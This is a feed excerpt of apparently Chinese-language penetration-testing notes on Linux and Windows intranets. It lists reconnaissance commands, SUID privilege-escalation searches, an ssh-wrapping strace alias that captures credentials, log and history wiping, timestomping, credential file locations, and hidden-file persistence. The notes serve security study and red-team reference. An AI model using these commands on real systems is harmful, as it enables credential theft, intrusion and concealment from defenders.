&lt;li&gt;&lt;code&gt;/etc/anacrontab&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/cron.*&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/anacrontab&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;开机启动项
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/rc.d/init.d/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;网络-路由和通信&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络-路由和通信&#34;&gt;#&lt;/a&gt; 网络、路由和通信&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;列出网络接口信息  &lt;code&gt;/sbin/ifconfig -a&lt;/code&gt;  /  &lt;code&gt;ip addr show&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;列出网络接口信息  &lt;code&gt;cat /etc/network/interfaces&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看系统 arp 表  &lt;code&gt;arp -a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;打印路由信息  &lt;code&gt;route&lt;/code&gt;  /  &lt;code&gt;ip ro show&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看 dns 配置信息  &lt;code&gt;cat /etc/resolv.conf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;打印本地端口开放信息  &lt;code&gt;netstat -an&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;列出 iptable 的配置规则  &lt;code&gt;iptables -L&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看端口服务映射  &lt;code&gt;cat /etc/services&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Hostname  &lt;code&gt;hostname -f&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看进程端口情况  &lt;code&gt;netstat -anltp | grep $PID&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;已安装程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#已安装程序&#34;&gt;#&lt;/a&gt; 已安装程序&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;rpm -qa --last&lt;/code&gt;  Redhat&lt;/li&gt;
&lt;li&gt;&lt;code&gt;yum list | grep installed&lt;/code&gt;  CentOS&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls -l /etc/yum.repos.d/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dpkg -l&lt;/code&gt;  Debian&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat /etc/apt/sources.list&lt;/code&gt;  Debian APT&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pkg_info&lt;/code&gt;  xBSD&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pkginfo&lt;/code&gt;  Solaris&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pacman -Q&lt;/code&gt;  Arch Linux&lt;/li&gt;
&lt;li&gt;&lt;code&gt;emerge&lt;/code&gt;  Gentoo&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件&#34;&gt;#&lt;/a&gt; 文件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;最近五天的文件  &lt;code&gt;find / -ctime +1 -ctime -5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;文件系统细节  &lt;code&gt;debugfs&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;公私钥信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#公私钥信息&#34;&gt;#&lt;/a&gt; 公私钥信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;~/.ssh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/ssh&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;日志&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志&#34;&gt;#&lt;/a&gt; 日志&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/var/log/boot.log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/cron&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/faillog&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/lastlog&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/messages&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/secure&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/syslog&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/syslog&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/run/utmp&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;虚拟环境检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟环境检测&#34;&gt;#&lt;/a&gt; 虚拟环境检测&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;vboxsf\|vboxguest&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;vmw_baloon\|vmxnet&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;xen-vbd\|xen-vnif&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;virtio_pci\|virtio_net&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;容器内信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器内信息收集&#34;&gt;#&lt;/a&gt; 容器内信息收集&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;capsh --print&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat /proc/1/cgroup&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;env | grep KUBE&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls -l .dockerenv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls -l /run/secrets/Kubernetes.io/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mount&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ps aux&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
&lt;h2 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;内核漏洞利用&lt;/li&gt;
&lt;li&gt;攻击有 root 权限的服务&lt;/li&gt;
&lt;li&gt;利用第三方服务提权&lt;/li&gt;
&lt;li&gt;通过有 SUID 属性的可执行文件
&lt;ul&gt;
&lt;li&gt;查找可能提权的可执行文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;find / -perm +4000 -ls&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;find / -user root -perm -4000 -exec ls -ldb &amp;#123;&amp;#125; \; 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;利用可用的 root 权限
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;利用误配置的 crontab 任务&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自启动&#34;&gt;#&lt;/a&gt; 自启动&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;/etc/init.d&lt;/li&gt;
&lt;li&gt;/etc/rc.d/rc.local&lt;/li&gt;
&lt;li&gt;~/.bashrc&lt;/li&gt;
&lt;li&gt;~/.zshrc&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门&#34;&gt;#&lt;/a&gt; 后门&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ssh 后门
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;alias ssh=&#39;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;后门账户&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常见应用
&lt;ul&gt;
&lt;li&gt;ICMP&lt;/li&gt;
&lt;li&gt;DNS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;icmp 后门&lt;/li&gt;
&lt;li&gt;后门端口复用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;  开头隐藏文件&lt;/li&gt;
&lt;li&gt;rootkit&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;痕迹清理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#痕迹清理&#34;&gt;#&lt;/a&gt; 痕迹清理&lt;/h1&gt;
&lt;h2 id=&#34;历史命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#历史命令&#34;&gt;#&lt;/a&gt; 历史命令&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kill -9 $$&lt;/code&gt;  kill history&lt;/li&gt;
&lt;li&gt;&lt;code&gt;history -c&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在  &lt;code&gt;HISTSIZE=0&lt;/code&gt;  中设置  &lt;code&gt;HISTSIZE=0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;清除修改日志文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#清除修改日志文件&#34;&gt;#&lt;/a&gt; 清除 / 修改日志文件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/var/log/btmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/lastlog&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/utmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/secure&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/log/message&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;登录痕迹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登录痕迹&#34;&gt;#&lt;/a&gt; 登录痕迹&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;删除  &lt;code&gt;~/.ssh/known_hosts&lt;/code&gt;  中记录&lt;/li&gt;
&lt;li&gt;修改文件时间戳
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;touch –r&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;删除 tmp 目录临时文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;操作痕迹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#操作痕迹&#34;&gt;#&lt;/a&gt; 操作痕迹&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;vim 不记录历史命令  &lt;code&gt;:set history=0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ssh 登录痕迹
&lt;ul&gt;
&lt;li&gt;无痕登录  &lt;code&gt;ssh -T user@host /bin/bash -i&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;覆写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#覆写文件&#34;&gt;#&lt;/a&gt; 覆写文件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;shred&lt;/li&gt;
&lt;li&gt;dd&lt;/li&gt;
&lt;li&gt;wipe&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;难点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#难点&#34;&gt;#&lt;/a&gt; 难点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征&lt;/li&gt;
&lt;li&gt;即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录&lt;/li&gt;
&lt;li&gt;留存的后门包含攻击者的信息&lt;/li&gt;
&lt;li&gt;使用的代理或跳板可能会被反向入侵&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在操作前检查是否有用户在线&lt;/li&gt;
&lt;li&gt;删除文件使用磁盘覆写的功能删除&lt;/li&gt;
&lt;li&gt;尽量和攻击前状态保持一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaTJXdkZtRjFxUWpieC1CYVN0WGIxUQ==&#34;&gt;Linux 入侵痕迹清理技巧&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
            <title>Windows内网渗透</title>
            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
            <category>Windows</category>
            <category>渗透</category>
            <category>信息收集</category>
            <category>痕迹清理</category>
            <pubDate>Mon, 28 Nov 2022 11:20:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
&lt;h2 id=&#34;基本命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本命令&#34;&gt;#&lt;/a&gt; 基本命令&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;主机名  &lt;code&gt;hostname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查询所有计算机名称  &lt;code&gt;dsquery computer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看配置及补丁信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;systeminfo&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wmic qfe get description,installedOn /format:csv&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;查看版本  &lt;code&gt;ver&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进程信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tasklist /svc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wmic process get caption,executablepath,commandline /format:csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;get-process&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;查看所有环境变量  &lt;code&gt;set&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看计划任务  &lt;code&gt;schtasks /QUERY /fo LIST /v&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看安装驱动  &lt;code&gt;DRIVERQUERY&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看操作系统信息
&lt;ul&gt;
&lt;li&gt;架构  &lt;code&gt;wmic os get osarchitecture&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;系统名  &lt;code&gt;wmic os get caption&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;查看逻辑盘  &lt;code&gt;wmic logicaldisk get caption&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看安装的软件信息  &lt;code&gt;wmic product get name,version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看服务信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wmic service list brief&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sc query&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Get-WmiObject win32_service | select PathName&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;域信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域信息&#34;&gt;#&lt;/a&gt; 域信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;获取当前组的计算机名  &lt;code&gt;net view&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;网络发现  &lt;code&gt;net view /all&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看所有域  &lt;code&gt;net view /domain&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;域森林、域树信息&lt;/li&gt;
&lt;li&gt;域信任信息  &lt;code&gt;nltest /domain_trusts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;定位域控  &lt;code&gt;net time /domain&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看域中的用户名  &lt;code&gt;dsquery user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查询域组名称  &lt;code&gt;net group /domain&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查询域管理员  &lt;code&gt;net group &amp;quot;Domain Admins&amp;quot; /domain&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;域控信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;nltest /dclist:xx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Get-NetDomain&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Get-NetDomainController&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net group &amp;quot;Domain controllers&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;组策略&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用户信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户信息&#34;&gt;#&lt;/a&gt; 用户信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查看用户
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;net user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;whoami&lt;/code&gt;  /  &lt;code&gt;whoami /priv&lt;/code&gt;  /  &lt;code&gt;whoami /all&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wmic useraccount get /ALL /format:csv&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用户特权信息  &lt;code&gt;whoami /priv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看当前权限  &lt;code&gt;net localgroup administrators&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看在线用户  &lt;code&gt;quser&lt;/code&gt;  /  &lt;code&gt;qwinsta&lt;/code&gt;  /  &lt;code&gt;query user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域  &lt;code&gt;net config Workstation&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ACL 信息  &lt;code&gt;get-acl&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;网络信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络信息&#34;&gt;#&lt;/a&gt; 网络信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;内网网段信息&lt;/li&gt;
&lt;li&gt;网卡信息  &lt;code&gt;ipconfig&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;外网出口&lt;/li&gt;
&lt;li&gt;ARP 表  &lt;code&gt;arp -a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;路由表  &lt;code&gt;route print&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;监听的端口  &lt;code&gt;netstat -ano&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;连接的端口&lt;/li&gt;
&lt;li&gt;端口信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Get-NetTCPConnection&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hosts 文件&lt;/li&gt;
&lt;li&gt;主备 DNS&lt;/li&gt;
&lt;li&gt;DNS 缓存
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ipconfig /displaydns&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;探测出网情况
&lt;ul&gt;
&lt;li&gt;powershell -c &amp;quot;1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(&#39;allports.exposed&#39;,$_)) _ } 2&gt;null&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防火墙&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防火墙&#34;&gt;#&lt;/a&gt; 防火墙&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查看防火墙状态  &lt;code&gt;netsh advfirewall show allprofiles&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;防火墙日志目录  &lt;code&gt;netsh firewall show logging&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;防火墙规则  &lt;code&gt;netsh advfirewall firewall show rule name=all&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;netsh firewall show config&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;netsh firewall show state&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;密码信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码信息&#34;&gt;#&lt;/a&gt; 密码信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Windows RDP 连接记录&lt;/li&gt;
&lt;li&gt;浏览器中保存的账号密码&lt;/li&gt;
&lt;li&gt;系统密码管理器中的各种密码&lt;/li&gt;
&lt;li&gt;无人值守安装文件中的密码信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;C:\sysprep.inf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\sysprep\sysprep.xml&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\Panther\Unattend\Unattended.xml&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\Panther\Unattended.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;票据信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#票据信息&#34;&gt;#&lt;/a&gt; 票据信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cmdkey /l&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;klist&lt;/li&gt;
&lt;li&gt;msf meterpreter&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;特殊文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊文件&#34;&gt;#&lt;/a&gt; 特殊文件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;文档
&lt;ul&gt;
&lt;li&gt;xlsx / xls&lt;/li&gt;
&lt;li&gt;docx / doc&lt;/li&gt;
&lt;li&gt;pptx / ppt&lt;/li&gt;
&lt;li&gt;vsdx / vsd&lt;/li&gt;
&lt;li&gt;md / txt&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;压缩文件
&lt;ul&gt;
&lt;li&gt;zip / rar / 7z&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VPN 配置
&lt;ul&gt;
&lt;li&gt;ovpn&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;代码
&lt;ul&gt;
&lt;li&gt;py / php / jsp / aspx / asp / sql&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;配置文件
&lt;ul&gt;
&lt;li&gt;conf / ini / xml&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特定关键字
&lt;ul&gt;
&lt;li&gt;账号 / 账户 / 登录 /login/user&lt;/li&gt;
&lt;li&gt;密码 /pass&lt;/li&gt;
&lt;li&gt;代码 / 文档 / 交接 / 备份 /git/svn&lt;/li&gt;
&lt;li&gt;邮箱 / 通讯录 / 集群 / 办公&lt;/li&gt;
&lt;li&gt;代理 / 内网 / VPN&lt;/li&gt;
&lt;li&gt;设备 / 资产&lt;/li&gt;
&lt;li&gt;系统 / 运维 / 拓扑 / 网络 / IT&lt;/li&gt;
&lt;li&gt;后台 / 管理员 / 数据库&lt;/li&gt;
&lt;li&gt;监控 / 隔离 / 防火墙 / 网闸 / 巡检&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;局域网存活主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#局域网存活主机&#34;&gt;#&lt;/a&gt; 局域网存活主机&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;NetBIOS 扫描&lt;/li&gt;
&lt;li&gt;OXID 扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;启用的共享文件夹&lt;/li&gt;
&lt;li&gt;回收站&lt;/li&gt;
&lt;li&gt;最近运行的命令&lt;/li&gt;
&lt;li&gt;访问文件历史记录&lt;/li&gt;
&lt;li&gt;查看补丁安装情况
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;日志与事件信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wevtutil&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eventvwr&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;注册表信息
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;reg&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安装的各类 agent 监控软件&lt;/li&gt;
&lt;li&gt;安装的杀毒软件&lt;/li&gt;
&lt;li&gt;查看 / 设置后缀关联
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;assoc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;assoc .ext=example&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PowerShell 版本&lt;/li&gt;
&lt;li&gt;.Net 版本&lt;/li&gt;
&lt;li&gt;Wi-Fi 密码&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
&lt;h2 id=&#34;隐藏文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#隐藏文件&#34;&gt;#&lt;/a&gt; 隐藏文件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;创建系统隐藏文件
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;attrib +s +a +r +h filename&lt;/code&gt;  /  &lt;code&gt;attrib +s +h filename&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
